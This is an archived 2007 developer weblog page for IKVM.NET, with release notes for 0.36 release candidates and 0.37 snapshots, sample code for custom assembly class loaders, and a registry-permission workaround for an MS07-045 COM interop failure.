</div></div><div class="date"><h2 class="dateHeader">Friday, 02 November 2007</h2></div>
<div class="newsItems"><a name="a2362280c-e04b-4511-8949-b3ed6ea530b8"></a><div class="entry">
	<h3 class="entryTitle">Development Snapshot Update</h3>
	<div class="entryBody">
		<P>Two fixes. This time I'm only releasing an updated version of IKVM.Runtime.dll as that is all that changed.</P>
<P><B>Changes:</B></P>
<UL>
<LI>AppDomainAssemblyClassLoader now skips AssemblyBuilders. Previous version would cause problems if any dynamically generated assemblies were present in the AppDomain.</LI>
<LI>Fixed a bug in the DynamicMethod based reflection implementation that caused a NullPointerException when generating the&nbsp;setter for&nbsp;a final instance field for code that isn't compiled with -strictfinalfieldsemantics.</LI></UL>
<P>Update available here: <A href="http://www.frijters.net/ikvmbin-upd-0.37.2862.zip">ikvmbin-upd-0.37.2862.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/02/2007 08:02:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2362280c-e04b-4511-8949-b3ed6ea530b8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2362280c-e04b-4511-8949-b3ed6ea530b8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 26 October 2007</h2></div>
<div class="newsItems"><a name="a375f1ff8-912a-4458-9120-f0a8cfb23b68"></a><div class="entry">
	<h3 class="entryTitle">Writing a Custom Assembly Class Loader</h3>
	<div class="entryBody">
		<P>A new development snapshot. It's now possible to write your own custom assembly class loader. This is the recommended pattern:</P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>MyCustomClassLoader</FONT> <FONT color=#0000ff>extends</FONT> <FONT color=#2b91af>ClassLoader</FONT><BR>{<BR>&nbsp; MyCustomClassLoader(cli.System.Reflection.<FONT color=#2b91af>Assembly</FONT> asm)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>super</FONT>(<FONT color=#0000ff>new</FONT> ikvm.runtime.<FONT color=#2b91af>AssemblyClassLoader</FONT>(asm));<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>protected</FONT> <FONT color=#2b91af>Class</FONT> findClass(<FONT color=#2b91af>String</FONT> name)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>// TODO: forward call to other class loader or load class and call defineClass()</FONT><BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>protected</FONT> <FONT color=#2b91af>URL</FONT> findResource(<FONT color=#2b91af>String</FONT> name)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>// TODO: forward call to other class loader or find resource somewhere</FONT><BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>protected</FONT> <FONT color=#2b91af>Enumeration</FONT> findResources(<FONT color=#2b91af>String</FONT> name)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>// TODO: forward call to other class loader or find resources somewhere</FONT><BR>&nbsp; }&nbsp; <BR>}</CODE>
<P>If you delegate to other class loaders, you should be careful to avoid loops in the delegation path. If you want to change the resource loading delegation order, you can override <CODE>getResource[s]()</CODE> instead of <CODE>findResource[s]()</CODE> relatively safely, but if you want to change the delegation order for classes you need to be more careful, because you cannot replace any classes that are defined in the assembly.</P>
<P>Of course, you can also reuse existing class loader classes. Here's an example with URLClassLoader:</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>MyCustomClassLoader</FONT> <FONT color=#0000ff>extends</FONT> java.net.<FONT color=#2b91af>URLClassLoader</FONT><BR>{<BR>&nbsp; MyCustomClassLoader(cli.System.Reflection.<FONT color=#2b91af>Assembly</FONT> asm)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>super</FONT>(<FONT color=#0000ff>new </FONT>java.net.<FONT color=#2b91af>URL</FONT>[0], <FONT color=#0000ff>new</FONT> ikvm.runtime.<FONT color=#2b91af>AssemblyClassLoader</FONT>(asm));<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>// see below why calling addURL() is safer than passing it to the super constructor</FONT><BR>&nbsp;&nbsp;&nbsp; addURL(<FONT color=#0000ff>new</FONT> java.net.<FONT color=#2b91af>URL</FONT>(<FONT color=#7d3302>"..."</FONT>));<BR>&nbsp; }<BR>}</CODE></P>
<P>Note that custom assembly class loader classes and their single argument Assembly constructor must be accessible from the assembly that they are applied to.</P>
<P><B>Delegation Magic</B></P>
<P>The <CODE>ikvm.runtime.AssemblyClassLoader</CODE> instance that is passed in as the parent class loader is a bit funny. It supports loading classes and resources from the assembly, but it effectively does this by magically delegating back to the custom class loader (without actually calling it, otherwise you'd get infinite recursion.) This means that classes from the assembly&nbsp;can be&nbsp;loaded via the parent class loader, but they report the custom class loader instance as their class loader.</P>
<P><B>Construction Magic</B></P>
<P>The custom assembly class loader is constructed when someone calls <CODE>getClassLoader()</CODE> on a class defined in that assembly for the first time, but what should <CODE>getClassLoader()</CODE> return while the custom class loader is being constructed? For consistencies sake, I've decided to apply some magic here and to make it return the object that is currently being constructed. This implies that you should call the base class constructor ASAP, because as long as you haven't done this the ClassLoader instance is in an unitialized state. After calling the base class constructor you can do additional work to configure your custom class loader, but you should take into account that while you are setting up your instance data, if you do anything that causes a class or resource to be loaded via your class loader, that your methods may run while initialization has not yet been completed. Note that this can only happen for the initiating thread. All other threads that call <CODE>getClassLoader()</CODE> will be blocked while the constructor is runnning. If the constructor throws an exception, the initiating call to <CODE>getClassLoader()</CODE> will see the exception, but all other calls will return the partially initialized class loader object.</P>
<P><B>Too Much Magic?</B></P>
<P>I certainly hope not, but I have to admit this is a scary feature. I recommend only writing your own custom assembly class loader if you really understand Java class loaders and there is no alternative.</P>
<P>Finally, <I>please</I> do send me feedback on this feature (even if it's a simple "I like it" or "It sucks"). I plan on backporting this to the 0.36 release, so it's important to get this right.</P>
<P><B>Changes:</B></P>
<UL>
<LI>More changes to keep up the pretense that an AssemblyClassLoader has already loaded all classes in the assembly.</LI>
<LI>Made AssemblyClassLoader public and moved it to ikvm.runtime package.</LI>
<LI>Allow non-public custom assembly class loaders (if they are defined in the same assembly).</LI>
<LI>Fixed ClassLoader.getSystemClassLoader() to return the custom assembly class loader for the main executable, if one is defined, even if the java.class.path or java.ext.dirs system property is set.</LI>
<LI>Restructured AssemblyClassLoader.GetProtectionDomain() to avoid calling any code while holding the lock.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.2855.zip">ikvmbin-0.37.2855.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/26/2007 11:25:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=375f1ff8-912a-4458-9120-f0a8cfb23b68"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=375f1ff8-912a-4458-9120-f0a8cfb23b68">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 22 October 2007</h2></div>
<div class="newsItems"><a name="a8a457a80-1e5f-4182-8f78-b2cd67845553"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've made a bunch of changes to support custom assembly class loaders. This should finally solve some of the issues caused by the <A HREF="/PermaLink.aspx?guid=4e0b7f7c-6f5d-42a3-a4d6-5d05a99c84ff">new class loader architecture</A>. Eventually it will be possible to write your own assembly class loader (hence the name <I>custom assembly class loaders</I>), but currently only the two provided ones are supported: <CODE>ikvm.runtime.AppDomainAssemblyClassLoader</CODE> and <CODE>ikvm.runtime.ClassPathAssemblyClassLoader</CODE>.</P>
<P><B>AppDomainAssemblyClassLoader</B></P>
<P>This approximates the pre-0.32 behavior by searching all currently loaded assemblies (after looking in the assembly itself and the assemblies it references).</P>
<P><B>ClassPathAssemblyClassLoader</B></P>
<P>This class loader supports dynamically loading classes and resources from the CLASSPATH (or java.class.path system property). It too first searches the assembly itself and any assemblies it references. This class loader makes the most sense as a replacement for the assembly class loader of the main executable, that way it will also be the system class loader. Note that if multiple assemblies use this class loader, they each will have a separate class loader instance that loads <B>different</B> classes (even though they may be based on the same class files).</P>
<P><B>How to Use</B></P>
<P>There is a new ikvmc option to specify a custom assembly class loader:</P>
<P><CODE>ikvmc -classloader:ikvm.runtime.AppDomainAssemblyClassLoader example.jar</CODE></P>
<P>For non-Java code you can apply a custom attribute to your code:</P>
<P><CODE><FONT color=#0000ff>using </FONT>System;<BR><BR>[assembly: IKVM.Attributes.<FONT color=#2b91af>CustomAssemblyClassLoader</FONT>(<FONT color=#0000ff>typeof</FONT>(ikvm.runtime.<FONT color=#2b91af>ClassPathAssemblyClassLoader</FONT>))]<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>SimpleJavaRunner</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>public static void </FONT>Main(<FONT color=#0000ff>string</FONT>[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>string</FONT>[] newArgs = <FONT color=#0000ff>new</FONT> string[args.Length - 1];<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Array</FONT>.Copy(args, 1, newArgs, 0, newArgs.Length);<BR>&nbsp;&nbsp;&nbsp; java.lang.<FONT color=#2b91af>Class</FONT>.forName(args[0])<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .getMethod(<FONT color=#a31515>"main"</FONT>, <FONT color=#0000ff>typeof</FONT>(<FONT color=#0000ff>string</FONT>[]))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .invoke(<FONT color=#0000ff>null</FONT>, <FONT color=#0000ff>new object</FONT>[] { newArgs });<BR>&nbsp; }<BR>}</CODE></P>
<P>You can also specify them in the app.config file, this overrides the above methods:</P>
<P><CODE><FONT color=#0000ff>&lt;?</FONT><FONT color=#a31515>xml</FONT> <FONT color=#ff0000>version</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>1.0</FONT>" <FONT color=#ff0000>encoding</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>utf-8</FONT>" <FONT color=#0000ff>?&gt;</FONT><BR><FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>configuration</FONT><FONT color=#0000ff>&gt;</FONT><BR>&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>appSettings</FONT><FONT color=#0000ff>&gt;</FONT><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>add</FONT> <FONT color=#ff0000>key</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>ikvm-classloader:MyExampleAssembly</FONT>" <FONT color=#ff0000>value</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>ikvm.runtime.AppDomainAssemblyClassLoader, IKVM.OpenJDK.ClassLibrary, Version=0.37.0.0, Culture=neutral, PublicKeyToken=null</FONT>" <FONT color=#0000ff>/&gt;</FONT><BR>&nbsp; <FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>appSettings</FONT><FONT color=#0000ff>&gt;</FONT><BR><FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>configuration</FONT><FONT color=#0000ff>&gt;</FONT></CODE></P>
<P>Here the key is <CODE>ikvm-classloader:</CODE> followed by the simple name of the assembly. The value must be the assembly qualified type name of the custom assembly class loader type.</P>
<P>As always, feedback is appreciated.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Implemented Custom Assembly Class Loaders.</LI>
<LI>Fixed URL.equals() for "ikvmres:" urls.</LI>
<LI>Fixed findResources() bug that caused resources in core assembly to show up twice if a .NET assembly explicitly referenced the core assembly.</LI>
<LI>Added check to prevent defineClass() on an assembly class loader from defining a class that already exists in the assembly.</LI>
<LI>Fixed Class.getModifiers() to mask out ACC_SUPER bit.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.2851.zip">ikvmbin-0.37.2851.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/22/2007 15:22:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8a457a80-1e5f-4182-8f78-b2cd67845553"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8a457a80-1e5f-4182-8f78-b2cd67845553">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 15 October 2007</h2></div>
<div class="newsItems"><a name="adbba25b3-a649-4f67-b9b6-5993605fbcd5"></a><div class="entry">
	<h3 class="entryTitle">Mono Summit 2007</h3>
	<div class="entryBody">
		<P>I'll be at the <A href="http://www.mono-project.com/MonoSummit2007">Mono Summit 2007</A>.</P>
<P><IMG src="http://www.mono-project.com/files/4/42/Summit.png"></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/15/2007 11:59:24 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=dbba25b3-a649-4f67-b9b6-5993605fbcd5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=dbba25b3-a649-4f67-b9b6-5993605fbcd5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 12 October 2007</h2></div>
<div class="newsItems"><a name="ab71549b6-f309-4f3f-8348-2720a636f26f"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 rc5</h3>
	<div class="entryBody">
		<P>Yet another release candidate and possibly not even the last one (more on that next week).</P>
<P>Changes:</P>
<UL>
<LI>Fixed reflection regression introduced in rc4.</LI>
<LI>Added workaround for .NET 3.5 beta <A href="https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=302592">breaking change</A>.</LI>
<LI>Added support for another binary compatibility issue (public classes nested in non-public classes).</LI>
<LI>Added workaround for another .NET 2.0 <A href="https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=285772">x64 JIT bug</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.4.zip">ikvmbin-0.36.0.4.zip</A>.</P>
<P>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.4.zip">ikvm-0.36.0.4.zip</A></P>
<P>External sources (haven't changed since rc1): <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A> </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/12/2007 18:28:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b71549b6-f309-4f3f-8348-2720a636f26f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b71549b6-f309-4f3f-8348-2720a636f26f">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 October 2007</h2></div>
<div class="newsItems"><a name="a383d3635-65a0-44ab-ab1d-e8cdb5cb41aa"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 rc4</h3>
	<div class="entryBody">
		<P>External forces inspired me (read: I was paid) to make another release candidate.</P>
<P>Reflection on .NET is very slow compared with Java and because IKVM reflection was built on top of .NET reflection, it too was very slow. I rewrote the lower levels of reflection to take advantage of <A href="http://msdn2.microsoft.com/en-us/library/system.reflection.emit.dynamicmethod.aspx">DynamicMethod</A> when running .NET 2.0. This allows the slow .NET reflection to be bypassed and optimized accessor methods to be generated dynamically. I also rewrote the part of serialization that uses reflection to get and set the field values to generate custom dynamic methods for the serialization process. Serialization is now up to 20x faster.</P>
<P>Unfortunately I had to disable the use of DynamicMethod when running on Mono, because testing revealed that Mono 1.2.5's implementation of DynamicMethod is still too buggy.</P>
<P>A remaining caveat wrt reflection performance is that you need to call <CODE>setAccessible(true)</CODE> to get the best performance when running on IKVM, because stack walking (which is needed to do the required access checks when you access a non-public member) is still very slow compared with Java.</P>
<P>Changes:</P>
<UL>
<LI>Improved serialization and reflection performance when running on .NET 2.0.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.3.zip">ikvmbin-0.36.0.3.zip</A>.</P>
<P>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.3.zip">ikvm-0.36.0.3.zip</A></P>
<P>External sources (haven't changed since rc1): <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A> </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/01/2007 15:31:54 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=383d3635-65a0-44ab-ab1d-e8cdb5cb41aa"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=383d3635-65a0-44ab-ab1d-e8cdb5cb41aa">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 20 September 2007</h2></div>
<div class="newsItems"><a name="a302210a3-a7e8-41f6-8358-9239099673a9"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 rc3</h3>
	<div class="entryBody">
		<P>This is probably the last release candiate before the official 0.36 release.</P>
<P>Changes:</P>
<UL>
<LI>Fixed non-blocking nio socket send of zero bytes to not return -1.</LI>
<LI>Fixed nio Selector.wakeup() race condition.</LI>
<LI>Added checks for code that uses reflection to call ClassLoader.defineClass() on the assembly class loader for ikvmc compiled classes to throw IllegalAccessError when the class tries to extend a non-public base class (instead of dying with a Critical Failure).</LI>
<LI>Fixed bug in the handling of Java annotations applied in .NET code (via the corresponding ikvmc generated attributes).</LI>
<LI>Significantly improved performance of Class.getModifiers().</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.2.zip">ikvmbin-0.36.0.2.zip</A>.</P>
<P>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.2.zip">ikvm-0.36.0.2.zip</A></P>
<P>External sources (haven't changed since rc1): <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A> </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/20/2007 15:55:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=302210a3-a7e8-41f6-8358-9239099673a9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=302210a3-a7e8-41f6-8358-9239099673a9">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 17 September 2007</h2></div>
<div class="newsItems"><a name="a0259c2c8-e9c1-4c92-88e5-5b459da76b86"></a><div class="entry">
	<h3 class="entryTitle">Two Useful Tools for IKVM.NET</h3>
	<div class="entryBody">
		<P><B>IKVMDoc</B></P>
<P>Brian Heineman wrote a doclet to convert Javadoc into .NET XML documentation that can be consumed by .NET tools like Visual Studio. This makes the type and member documentation available in the Visual Studio IntelliSense popups. Very nice! There's still room for improvement, especially in the area of converting broken html tags into well formed xml tags. The code is available <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/ikvmdoc/IKVMDoc.java?view=markup">cvs</A>. I've used it to generate an xml documentation file for IKVM.OpenJDK.ClassLibrary.dll and that can be downloaded <A href="http://www.frijters.net/ikvm-0.36-doc.zip">here</A>.</P>
<P>In future IKVM releases I plan to include an ikvmc compiled version of IKVMDoc.</P>
<P><B>jar2ikvmc</B></P>
<P>Gena Donchyts wrote a handy tool that analyzes a bunch of jars and generates a script to ikvmc compile these jars in the right order and with the required (static) dependencies. The tool and documentation are available <A href="http://don.env.com.ua/index.php?option=com_content&amp;task=view&amp;id=12&amp;Itemid=1">here</A>.</P>
<P><B>Thanks</B></P>
<P>Thanks to Brian and Gena for providing these great tools!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/17/2007 08:18:25 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0259c2c8-e9c1-4c92-88e5-5b459da76b86"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0259c2c8-e9c1-4c92-88e5-5b459da76b86">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 13 September 2007</h2></div>
<div class="newsItems"><a name="a0ed43b5c-cd68-42b9-ac37-d6fb57c938d1"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 rc2</h3>
	<div class="entryBody">
		<P>Release candidate 2.</P>
<P>Changes:</P>
<UL>
<LI>Fixed annotation handling to use Enum.valueOf() instead of reflection, to prevent IllegalAccessException when accessing non-public enum.</LI>
<LI>Bootstrap packages are no longer sealed.</LI>
<LI>Packages for ikvmc compiled code are no longer sealed automatically (only when they are sealed in the manifest).</LI>
<LI>Implemented support for enabling/disabling assertions in ikvm.exe.</LI>
<LI>Fixed ikvmstub exception when the resulting jar is empty.</LI>
<LI>Added support for creating proxies for non-public interfaces in ikvmc compiled assemblies.</LI>
<LI>Made method annotation resolution lazy, to deal with annotations that annotate themselves.</LI>
<LI>Fixed bug in finalize method handling that could cause compiler error if base class explicitly called finalize method in derived class.</LI>
<LI>Improved JLS binary compatibility support.</LI>
<LI>Fixed implicit conversion from System.Type to java.lang.Class to return null instead of throwing a NullReferenceException for unrepresentable types.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.1.zip">ikvmbin-0.36.0.1.zip</A>.</P>
<P>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.1.zip">ikvm-0.36.0.1.zip</A></P>
<P>External sources (haven't changed since rc1): <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/13/2007 11:53:26 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0ed43b5c-cd68-42b9-ac37-d6fb57c938d1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0ed43b5c-cd68-42b9-ac37-d6fb57c938d1">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 03 September 2007</h2></div>
<div class="newsItems"><a name="ac7d7252c-fe92-4100-9229-942251151d81"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 rc1</h3>
	<div class="entryBody">
		<P>Release candidate 1 of the first OpenJDK based release.</P>
<P>Compared with the last snapshot I made one small change, I implemented the new 1.6 JNI method.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.0.zip">ikvmbin-0.36.0.0.zip</A>.</P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.36.0.0.zip">ikvm-0.36.0.0.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A></P>
<P>If you want to build from source, you need the classpath and openjdk zips as well. The classpath-0.95-stripped.zip file contains the required AWT/Swing sources (from a <A href="http://www.nabble.com/FYI:-Compilation-errors-when-mixing-with-OpenJDK-code-tf3956640.html">patched</A> version of GNU Classpath 0.95). The openjdk-b13-stripped.zip contains the required sources and the required generated sources (from running an OpenJDK build on Linux). These two zips need to be unzipped in the same directory as where you unzip ikvm-0.36.0.0.zip. I've tested the build on Windows with .NET 1.1, .NET 2.0 and Mono 1.2.3 and on Linux with Mono 1.2.5.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/03/2007 09:54:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c7d7252c-fe92-4100-9229-942251151d81"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c7d7252c-fe92-4100-9229-942251151d81">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 29 August 2007</h2></div>
<div class="newsItems"><a name="a53172dc5-b311-4a86-8338-084a9fd015b9"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>One more snapshot before release candidate 1 with a couple of fixes:</P>
<UL>
<LI>Windows x64 specific binaries are now included (in the ikvm\bin-x64 directory).</LI>
<LI>Enabled workaround for x64 tail call optimization.</LI>
<LI>Implemented clearing of SoftReferences. They're still not guaranteed to be cleared before an OutOfMemoryError, but the new behavior is hopefully more reasonable than never clearing them.</LI>
<LI>Fixed code generator bug that could cause AbstractMethodError to be thrown when subclassing a .NET type that has an explicit interface method implementation.</LI>
<LI>Integrated IcedTea updates to support PBEwithMD5andDES.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-openjdk-0.35.2796.zip">ikvmbin-openjdk-0.35.2796.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/29/2007 08:26:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=53172dc5-b311-4a86-8338-084a9fd015b9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=53172dc5-b311-4a86-8338-084a9fd015b9">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 28 August 2007</h2></div>
<div class="newsItems"><a name="a9bdc9af1-7f46-482e-bd5a-aed5fe82a2f5"></a><div class="entry">
	<h3 class="entryTitle">MS07-045 bug</h3>
	<div class="entryBody">
		<P>We interrupt our regularly scheduled programming for some Microsoft idiocy. If you have a classic ASP website that instantiates .NET classes via COM interop that suddenly stopped working after installing MS07-045 and you're now getting the dreaded 0x8000FFFF Catastrophic failure aka E_UNEXPECTED, you can fix that by allowing Everyone Read access to <CODE>HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones</CODE> or by running <A href="http://www.frijters.net/MS07-045-patch.zip">MS07-045-patch</A> (.NET 2.0 required) to make the registry permission changes for you (you need admin rights to make the changes or run the executable).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/28/2007 11:38:35 (W. Europe Daylight Time, UTC+02:00)&nbsp;
